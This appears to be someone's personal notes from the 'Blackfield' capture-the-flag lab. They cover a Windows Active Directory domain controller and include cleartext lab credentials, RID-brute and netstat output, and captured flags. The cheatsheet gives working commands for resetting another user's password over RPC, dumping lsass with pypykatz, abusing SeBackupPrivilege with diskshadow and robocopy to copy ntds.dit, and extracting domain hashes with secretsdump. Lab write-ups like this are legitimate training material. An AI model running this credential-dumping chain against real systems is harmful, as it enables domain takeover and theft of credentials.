# Blackfield \[Hard]

## Report



## Cheatsheet

```
clock-skew: 6h59m59s

cut -d "0" -f 1 users | awk '{print $1}' > userlist  

[-] BLACKFIELD.local\DMedeme:DMedeme STATUS_ACCESS_DENIED 

support:#00^BlackKnight

Accounts are in the form BLACKFIELD[number]
net rpc password "audit2020" "Mango@34" -U "blackfield.local"/"support"%"#00^BlackKnight" -S "10.10.10.192"

Forensics Share as audit2020

Hotfix(s):                 3 Hotfix(s) Installed.
                           [01]: KB4514366
                           [02]: KB4512577
                           [03]: KB4512578


cat domain_admins.txt 
��Group name     Domain Admins
Comment        Designated administrators of the domain

Members

-------------------------------------------------------------------------------
Administrator       Ipwn3dYourCompany     
The command completed successfully.


pypykatz dump file
pypykatz lsa minidump lsass.DMP
Get svc_backup hash and winrm

SeBAckupPrivilege - i think we got the local admin not the domain admin thats why it didnt work with only sam and system
we needed the ntds file even with DCSync remember they always go for this oen
get ntds.dit file using hacks

upload raj.dsh
diskshadow /s raj.dsh
robocopy /b z:\windows\ntds . ntds.dit
download ntds.dit
python3 secretsdump.py -ntds ~/htb/rooms/blackfield/ntds.dit -system ~/htb/rooms/blackfield/system local

```

## Loot

### Creds



### Enumeration

#### SMB

RID brute

```
SMB         10.10.10.192    445    DC01             1414: BLACKFIELD\lydericlefebvre (SidTypeUser)
SMB         10.10.10.192    445    DC01             1415: BLACKFIELD\PC01$ (SidTypeUser)
SMB         10.10.10.192    445    DC01             1416: BLACKFIELD\PC02$ (SidTypeUser)
SMB         10.10.10.192    445    DC01             1417: BLACKFIELD\PC03$ (SidTypeUser)
SMB         10.10.10.192    445    DC01             1418: BLACKFIELD\PC04$ (SidTypeUser)
SMB         10.10.10.192    445    DC01             1419: BLACKFIELD\PC05$ (SidTypeUser)
SMB         10.10.10.192    445    DC01             1420: BLACKFIELD\PC06$ (SidTypeUser)
SMB         10.10.10.192    445    DC01             1421: BLACKFIELD\PC07$ (SidTypeUser)
SMB         10.10.10.192    445    DC01             1422: BLACKFIELD\PC08$ (SidTypeUser)
SMB         10.10.10.192    445    DC01             1423: BLACKFIELD\PC09$ (SidTypeUser)
SMB         10.10.10.192    445    DC01             1424: BLACKFIELD\PC10$ (SidTypeUser)
SMB         10.10.10.192    445    DC01             1425: BLACKFIELD\PC11$ (SidTypeUser)
SMB         10.10.10.192    445    DC01             1426: BLACKFIELD\PC12$ (SidTypeUser)
SMB         10.10.10.192    445    DC01             1427: BLACKFIELD\PC13$ (SidTypeUser)
SMB         10.10.10.192    445    DC01             1428: BLACKFIELD\SRV-WEB$ (SidTypeUser)
SMB         10.10.10.192    445    DC01             1429: BLACKFIELD\SRV-FILE$ (SidTypeUser)
SMB         10.10.10.192    445    DC01             1430: BLACKFIELD\SRV-EXCHANGE$ (SidTypeUser)
SMB         10.10.10.192    445    DC01             1431: BLACKFIELD\SRV-INTRANET$ (SidTypeUser)
```

#### Netstat

```
  Proto  Local Address          Foreign Address        State
  TCP    127.0.0.1:389          DC01:49679             ESTABLISHED
  TCP    127.0.0.1:389          DC01:49681             ESTABLISHED
  TCP    127.0.0.1:389          DC01:49698             ESTABLISHED
  TCP    127.0.0.1:389          DC01:51060             ESTABLISHED
  TCP    127.0.0.1:389          DC01:51125             ESTABLISHED
  TCP    127.0.0.1:49679        DC01:ldap              ESTABLISHED
  TCP    127.0.0.1:49681        DC01:ldap              ESTABLISHED
  TCP    127.0.0.1:49698        DC01:ldap              ESTABLISHED
  TCP    127.0.0.1:51060        DC01:ldap              ESTABLISHED
  TCP    127.0.0.1:51125        DC01:ldap              ESTABLISHED
  TCP    192.168.86.156:389     DC01:51016             ESTABLISHED
  TCP    192.168.86.156:389     DC01:60961             ESTABLISHED
  TCP    192.168.86.156:389     DC01:60987             ESTABLISHED
  TCP    192.168.86.156:389     DC01:60993             ESTABLISHED
  TCP    192.168.86.156:51016   DC01:ldap              ESTABLISHED
  TCP    192.168.86.156:60961   DC01:ldap              ESTABLISHED
  TCP    192.168.86.156:60987   DC01:ldap              ESTABLISHED
  TCP    192.168.86.156:60993   DC01:ldap              ESTABLISHED
  TCP    192.168.86.156:63810   40.67.251.132:https    ESTABLISHED
  TCP    192.168.86.156:63830   40.67.251.132:https    ESTABLISHED
  TCP    [::1]:49667            DC01:60989             ESTABLISHED
  TCP    [::1]:49667            DC01:63777             ESTABLISHED
  TCP    [::1]:49667            DC01:63836             ESTABLISHED
  TCP    [::1]:51178            DC01:epmap             TIME_WAIT
  TCP    [::1]:60989            DC01:49667             ESTABLISHED
  TCP    [::1]:63777            DC01:49667             ESTABLISHED
  TCP    [::1]:63836            DC01:49667             ESTABLISHED

```

### Flags

```
3920bb317a0bef51027e2852be64b543
4375a629c7c67c8e29db269060c955cb
```

### Proof
